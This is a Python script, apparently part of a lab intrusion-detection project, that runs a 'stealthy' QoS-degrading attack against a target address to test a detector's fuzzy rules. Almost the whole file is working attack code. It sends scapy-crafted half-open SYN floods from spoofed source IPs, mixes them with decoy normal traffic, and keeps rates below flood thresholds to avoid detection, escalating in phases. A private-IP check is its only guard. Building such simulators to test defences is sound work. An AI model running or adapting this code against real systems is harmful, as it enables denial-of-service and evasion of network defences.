"""Stealthy QoS-Degrading Attack Simulator

Simulates a low-level flood attack mixed with normal traffic that degrades
Quality of Service without triggering obvious flood signatures. Tests the
model's ability to detect subtle, sophisticated attacks.

Usage:
    python stealthy_qos_attack.py --target <PI_IP> --duration 300

Characteristics:
- Mixes normal legitimate traffic with low-rate attack traffic
- Attack rate stays below typical flood thresholds (50-120 pps)
- Uses half-open SYN connections to degrade server resources
- Gradually increases attack proportion over time
- Should trigger THROTTLE warnings and eventual BLOCK
- Tests fuzzy rule sensitivity (rules 1, 4, 8)

WARNING: This simulates an actual attack. Use only in controlled lab environment.
"""

import argparse
import os
import random
import socket
import sys
import threading
import time

try:
    from scapy.all import IP, TCP, UDP, send
    SCAPY = True
except ImportError:
    SCAPY = False


def require_scapy() -> bool:
    """Check for scapy availability."""
    if SCAPY:
        return True
    print("[WARN] Scapy not available - reduced attack effectiveness")
    print("[WARN] Install: pip install scapy")
    return False


def send_scapy_packet(pkt) -> bool:
    """Send crafted packet."""
    try:
        send(pkt, verbose=False)
        return True
    except (PermissionError, OSError):
        return False


def make_fake_ips(count: int) -> list[str]:
    """Generate fake source IPs."""
    return [f"10.{random.randint(100, 250)}.{random.randint(1, 254)}.{random.randint(2, 254)}" 
            for _ in range(count)]


def normal_traffic_background(target: str, open_port: int, stop_at: float, intensity: float = 0.5) -> None:
    """Generate background normal traffic to mask the attack."""
    sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    payloads = [os.urandom(random.randint(32, 256)) for _ in range(10)]
    
    print(f"  [NORMAL] Background traffic started (intensity: {intensity:.1f})")
    
    sent_tcp = 0
    sent_udp = 0
    
    while time.monotonic() < stop_at:
        # TCP connections with full handshakes
        if random.random() < intensity * 0.3:
            try:
                s = socket.create_connection((target, open_port), timeout=0.5)
                s.sendall(random.choice(payloads))
                s.close()
                sent_tcp += 1
            except (OSError, socket.timeout):
                pass
        
        # UDP packets
        if random.random() < intensity * 0.4:
            try:
                sock_udp.sendto(
                    random.choice(payloads),
                    (target, random.choice([53, 1883, 5353, 8883]))
                )
                sent_udp += 1
            except OSError:
                pass
        
        time.sleep(random.uniform(0.1, 0.4))
    
    sock_udp.close()
    print(f"  [NORMAL] Background traffic stopped (TCP: {sent_tcp}, UDP: {sent_udp})")


def stealthy_syn_flood(target: str, port: int, stop_at: float, sources: list[str], 
                       attack_intensity: threading.Event, stats: dict) -> None:
    """Low-rate half-open SYN flood mixed with normal traffic."""
    print(f"  [ATTACK] Stealthy SYN flood started")
    
    if not require_scapy():
        # Fallback: slow connect-and-abandon
        sent = 0
        while time.monotonic() < stop_at:
            if attack_intensity.is_set():
                rate = random.uniform(30, 80)
            else:
                rate = random.uniform(10, 30)
            
            try:
                s = socket.socket()
                s.setblocking(False)
                s.connect_ex((target, port))
                # Don't close - leave half-open (will timeout)
                sent += 1
            except OSError:
                pass
            
            time.sleep(1.0 / rate)
        
        stats['attack_sent'] = sent
        print(f"  [ATTACK] Stopped (fallback mode, {sent} connections)")
        return
    
    # Scapy-based SYN flood
    sent = 0
    last_report = time.monotonic()
    
    while time.monotonic() < stop_at:
        now = time.monotonic()
        
        # Dynamic rate based on intensity
        if attack_intensity.is_set():
            rate = random.randint(80, 120)  # Higher intensity
        else:
            rate = random.randint(40, 70)   # Lower intensity
        
        interval = 1.0 / rate
        
        # Send burst
        burst_size = random.randint(5, 15)
        for _ in range(burst_size):
            src = random.choice(sources) if sources else None
            pkt = IP(dst=target) / TCP(
                sport=random.randint(30000, 65000),
                dport=port,
                flags="S",
                seq=random.randint(0, 2**31),
                window=random.choice([512, 1024, 2048, 4096])  # Vary to look more natural
            )
            
            if src:
                pkt[IP].src = src
            
            if not send_scapy_packet(pkt):
                stats['attack_sent'] = sent
                return
            
            sent += 1
        
        # Progress report
        if now - last_report >= 15.0:
            print(f"    [ATTACK] Sent {sent} half-open SYNs (current rate: ~{rate} pps)")
            last_report = now
        
        time.sleep(max(0.0, burst_size * interval - 0.005))
    
    stats['attack_sent'] = sent
    print(f"  [ATTACK] Stopped ({sent} half-open SYNs)")


def escalation_controller(attack_intensity: threading.Event, duration: float) -> None:
    """Control attack intensity escalation over time."""
    phases = [
        (0.15, False, "Warm-up: low-rate probing"),
        (0.25, True, "Escalation: moderate attack"),
        (0.15, False, "Brief pause"),
        (0.25, True, "Peak: sustained attack"),
        (0.20, False, "Cool-down"),
    ]
    
    print(f"  [CONTROL] Escalation timeline:")
    cumulative = 0.0
    for i, (proportion, intense, desc) in enumerate(phases):
        phase_dur = duration * proportion
        cumulative += phase_dur
        print(f"    Phase {i+1}: {desc} ({phase_dur:.0f}s, ends at {cumulative:.0f}s)")
    print()
    
    start = time.monotonic()
    
    for proportion, intense, description in phases:
        phase_duration = duration * proportion
        print(f"  [CONTROL] {description} (intensity: {'HIGH' if intense else 'LOW'})")
        
        if intense:
            attack_intensity.set()
        else:
            attack_intensity.clear()
        
        time.sleep(phase_duration)
    
    print(f"  [CONTROL] Escalation completed")


def run_simulation(args) -> None:
    """Main simulation orchestrator."""
    print(f"\n{'='*70}")
    print("Stealthy QoS-Degrading Attack Simulator")
    print(f"{'='*70}")
    print(f"Target: {args.target}:{args.port}")
    print(f"Duration: {args.duration}s")
    print(f"Normal traffic: {args.normal_intensity:.1%}")
    print(f"Attack sources: {args.sources}")
    print(f"Scapy: {'Available' if SCAPY else 'NOT available (reduced capability)'}")
    print(f"{'='*70}")
    print("\nThis attack combines:")
    print("  - Legitimate background traffic (normal devices)")
    print("  - Low-rate half-open SYN flood (resource exhaustion)")
    print("  - Gradual intensity escalation")
    print("  - Multiple source IPs (spoofed, requires scapy+admin)")
    print("\nExpected behavior:")
    print("  - Initial: GREEN (below threshold)")
    print("  - Mid: THROTTLE warnings (suspicious patterns)")
    print("  - Peak: BLOCK (fuzzy rules 1, 4, 8 activate)")
    print("  - End: Auto-release after attack stops")
    print(f"{'='*70}\n")
    
    stop_at = time.monotonic() + args.duration
    attack_intensity = threading.Event()  # Shared flag for intensity control
    stats = {'attack_sent': 0}
    
    # Prepare fake sources
    sources = make_fake_ips(args.sources) if args.sources > 0 and SCAPY else []
    
    # Start threads
    threads = []
    
    # Background normal traffic
    normal_thread = threading.Thread(
        target=normal_traffic_background,
        args=(args.target, args.open_port, stop_at, args.normal_intensity),
        daemon=True
    )
    normal_thread.start()
    threads.append(normal_thread)
    
    # Attack traffic
    attack_thread = threading.Thread(
        target=stealthy_syn_flood,
        args=(args.target, args.port, stop_at, sources, attack_intensity, stats),
        daemon=True
    )
    attack_thread.start()
    threads.append(attack_thread)
    
    # Escalation controller
    control_thread = threading.Thread(
        target=escalation_controller,
        args=(attack_intensity, args.duration),
        daemon=True
    )
    control_thread.start()
    threads.append(control_thread)
    
    # Status monitoring
    start_time = time.time()
    try:
        while time.monotonic() < stop_at:
            elapsed = time.time() - start_time
            remaining = args.duration - elapsed
            
            if int(elapsed) % 30 == 0 and remaining > 0:
                print(f"  [STATUS] Running... {elapsed:.0f}s elapsed, {remaining:.0f}s remaining")
            
            time.sleep(1.0)
    except KeyboardInterrupt:
        print("\n  [STOP] Interrupted by user")
    
    # Wait for threads
    for t in threads:
        t.join(timeout=3.0)
    
    print(f"\n{'='*70}")
    print(f"Simulation completed. Duration: {time.time() - start_time:.1f}s")
    print(f"Attack packets sent: {stats.get('attack_sent', 0)}")
    print("\nDashboard observations to note:")
    print("  - Threat score evolution (gradual increase)")
    print("  - Source Threat Board (shows attack IPs)")
    print("  - Fuzzy rule activations (check Explanation panel)")
    print("  - Mitigation timeline (throttle → block → release)")
    print(f"{'='*70}\n")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Stealthy QoS-Degrading Attack Simulator (TESTING ONLY)"
    )
    parser.add_argument("--target", required=True, help="Target Pi IP (private lab address)")
    parser.add_argument("--port", type=int, default=80, help="Attack target port")
    parser.add_argument("--open-port", type=int, default=8080, help="Port for normal traffic")
    parser.add_argument("--duration", type=int, default=300, help="Simulation duration (seconds)")
    parser.add_argument("--sources", type=int, default=6, help="Number of fake source IPs")
    parser.add_argument("--normal-intensity", type=float, default=0.5, 
                        help="Normal traffic intensity (0.1-1.0)")
    
    args = parser.parse_args()
    
    # Validation
    import ipaddress
    try:
        ip = ipaddress.ip_address(args.target)
        if not (ip.is_private or ip.is_loopback or ip.is_link_local):
            sys.exit(f"ERROR: Refusing to target non-private IP {args.target}. Lab only!")
    except ValueError:
        sys.exit(f"ERROR: Invalid IP address: {args.target}")
    
    if args.normal_intensity < 0.1 or args.normal_intensity > 1.0:
        sys.exit("ERROR: --normal-intensity must be between 0.1 and 1.0")
    
    if args.duration < 60:
        sys.exit("ERROR: Duration must be at least 60 seconds")
    
    if args.sources > 0 and not SCAPY:
        print("[WARN] Source rotation requires scapy - using single source")
        args.sources = 0
    
    run_simulation(args)


if __name__ == "__main__":
    main()
